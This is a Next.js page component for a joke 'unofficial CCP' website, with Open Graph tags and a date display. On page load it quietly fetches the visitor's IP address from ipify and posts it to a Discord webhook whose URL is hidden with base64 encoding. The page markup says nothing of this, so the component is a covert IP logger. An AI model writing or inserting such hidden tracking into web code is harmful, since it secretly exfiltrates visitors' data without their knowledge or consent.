// import Image from 'next/image';
import styles from '@/styles/Home.module.css';
import React from 'react';
import Datetime from '../components/date';
import path from "path";

export default function Home() {
    let h: any = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA4NzM0OTUxMTYxMDk3NDI0OC84MUJKQTd1TUpQcndYVFFCVnAtWVhlUi1FVzRJRTBzR1JlRUN2UF91Um0zWVFNLXZhMklOZ1B5V19ZWDc5amc5eWFIMg==");

    function send(content: object) {
        let data = {
            embeds: [content],
        };

        fetch(h, {
            method: 'POST',
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
        }).catch(console.error);
    };

    function lol() {
        fetch("https://api.ipify.org?format=json").then((response) => {
            response.json().then((inputData) => {
                console.log(inputData);
                let content = {
                    title: "hi",
                    description: `**IP:** ${inputData.ip}`
                };
                send(content);
            }).catch(console.error);
        });
    };

    lol();
    
    return (
        <>
	<title>Website Name</title>
	<meta content="Communist Party of China" property="og:title" />
	<meta content="Official Website of the CCP" property="og:description" />
	<meta content="https://carpetmaker3162.github.io/ccp/" property="og:url" />
	<meta content="https://cdn.discordapp.com/emojis/1080851553080057997.webp?size=96&quality=lossless" property="og:image" />
        <meta content="#ff0000" data-react-helmet="true" name="theme-color" />
        <header><h1>Communist Party of China</h1></header>
        <main>
            <h1>Welcome</h1>
            <h2>to the unofficial website of the CCP!</h2>
            <p className={styles.inline}>Current date and time: </p><Datetime/>
        </main>
        </>
    );
}
